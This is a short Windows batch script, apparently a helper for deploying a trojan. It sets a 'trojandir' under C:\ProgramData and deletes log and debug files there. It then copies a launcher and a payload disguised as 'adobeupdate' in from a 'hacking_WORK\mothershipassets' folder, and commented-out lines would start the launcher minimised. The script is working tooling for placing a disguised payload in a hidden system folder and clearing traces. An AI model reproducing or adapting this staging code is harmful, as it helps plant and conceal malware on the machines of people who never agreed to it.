FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

set trojandir=C:\ProgramData\owd
cd /d %trojandir%

del /f /q debug_test_*
del /f /q *.log
del /f /q adobeupdate
del /f /q *_running

copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd %trojandir%
copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate %trojandir%
REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
REM start "" /min launch.cmd